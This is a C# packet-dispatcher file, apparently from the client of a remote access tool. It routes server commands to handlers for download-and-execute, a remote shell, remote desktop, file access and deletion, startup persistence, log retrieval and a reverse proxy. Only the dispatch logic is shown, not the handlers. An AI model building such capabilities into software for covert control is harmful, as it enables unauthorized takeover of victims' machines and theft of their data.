using xClient.Core.Commands;
using xClient.Core.Networking;
using xClient.Core.ReverseProxy;

namespace xClient.Core.Packets
{
    public static class PacketHandler
    {
        public static void HandlePacket(Client client, IPacket packet)
        {
            var type = packet.GetType();

            if (type == typeof(ServerPackets.InitializeCommand))
            {
                CommandHandler.HandleInitializeCommand((ServerPackets.InitializeCommand)packet, client);
            }
            else if (type == typeof(ServerPackets.DownloadAndExecute))
            {
                CommandHandler.HandleDownloadAndExecuteCommand((ServerPackets.DownloadAndExecute)packet,
                    client);
            }
            else if (type == typeof(ServerPackets.UploadAndExecute))
            {
                CommandHandler.HandleUploadAndExecute((ServerPackets.UploadAndExecute)packet, client);
            }
            else if (type == typeof(ServerPackets.Disconnect))
            {
                Program.Disconnect();
            }
            else if (type == typeof(ServerPackets.Reconnect))
            {
                Program.Disconnect(true);
            }
            else if (type == typeof(ServerPackets.Uninstall))
            {
                CommandHandler.HandleUninstall((ServerPackets.Uninstall)packet, client);
            }
            else if (type == typeof(ServerPackets.Desktop))
            {
                CommandHandler.HandleRemoteDesktop((ServerPackets.Desktop)packet, client);
            }
            else if (type == typeof(ServerPackets.GetProcesses))
            {
                CommandHandler.HandleGetProcesses((ServerPackets.GetProcesses)packet, client);
            }
            else if (type == typeof(ServerPackets.KillProcess))
            {
                CommandHandler.HandleKillProcess((ServerPackets.KillProcess)packet, client);
            }
            else if (type == typeof(ServerPackets.StartProcess))
            {
                CommandHandler.HandleStartProcess((ServerPackets.StartProcess)packet, client);
            }
            else if (type == typeof(ServerPackets.Drives))
            {
                CommandHandler.HandleDrives((ServerPackets.Drives)packet, client);
            }
            else if (type == typeof(ServerPackets.Directory))
            {
                CommandHandler.HandleDirectory((ServerPackets.Directory)packet, client);
            }
            else if (type == typeof(ServerPackets.DownloadFile))
            {
                CommandHandler.HandleDownloadFile((ServerPackets.DownloadFile)packet, client);
            }
            else if (type == typeof(ServerPackets.MouseClick))
            {
                CommandHandler.HandleMouseClick((ServerPackets.MouseClick)packet, client);
            }
            else if (type == typeof(ServerPackets.GetSystemInfo))
            {
                CommandHandler.HandleGetSystemInfo((ServerPackets.GetSystemInfo)packet, client);
            }
            else if (type == typeof(ServerPackets.VisitWebsite))
            {
                CommandHandler.HandleVisitWebsite((ServerPackets.VisitWebsite)packet, client);
            }
            else if (type == typeof(ServerPackets.ShowMessageBox))
            {
                CommandHandler.HandleShowMessageBox((ServerPackets.ShowMessageBox)packet, client);
            }
            else if (type == typeof(ServerPackets.Update))
            {
                CommandHandler.HandleUpdate((ServerPackets.Update)packet, client);
            }
            else if (type == typeof(ServerPackets.Monitors))
            {
                CommandHandler.HandleMonitors((ServerPackets.Monitors)packet, client);
            }
            else if (type == typeof(ServerPackets.ShellCommand))
            {
                CommandHandler.HandleShellCommand((ServerPackets.ShellCommand)packet, client);
            }
            else if (type == typeof(ServerPackets.Rename))
            {
                CommandHandler.HandleRename((ServerPackets.Rename)packet, client);
            }
            else if (type == typeof(ServerPackets.Delete))
            {
                CommandHandler.HandleDelete((ServerPackets.Delete)packet, client);
            }
            else if (type == typeof(ServerPackets.Action))
            {
                CommandHandler.HandleAction((ServerPackets.Action)packet, client);
            }
            else if (type == typeof(ServerPackets.GetStartupItems))
            {
                CommandHandler.HandleGetStartupItems((ServerPackets.GetStartupItems)packet, client);
            }
            else if (type == typeof(ServerPackets.AddStartupItem))
            {
                CommandHandler.HandleAddStartupItem((ServerPackets.AddStartupItem)packet, client);
            }
            else if (type == typeof(ServerPackets.RemoveStartupItem))
            {
                CommandHandler.HandleAddRemoveStartupItem((ServerPackets.RemoveStartupItem)packet, client);
            }
            else if (type == typeof(ServerPackets.DownloadFileCanceled))
            {
                CommandHandler.HandleDownloadFileCanceled((ServerPackets.DownloadFileCanceled)packet,
                    client);
            }
            else if (type == typeof(ServerPackets.GetLogs))
            {
                CommandHandler.HandleGetLogs((ServerPackets.GetLogs)packet, client);
            }
            else if (type == typeof(ReverseProxy.Packets.ReverseProxyConnect) ||
                     type == typeof(ReverseProxy.Packets.ReverseProxyConnectResponse) ||
                     type == typeof(ReverseProxy.Packets.ReverseProxyData) ||
                     type == typeof(ReverseProxy.Packets.ReverseProxyDisconnect))
            {
                ReverseProxyCommandHandler.HandleCommand(client, packet);
            }
        }
    }
}
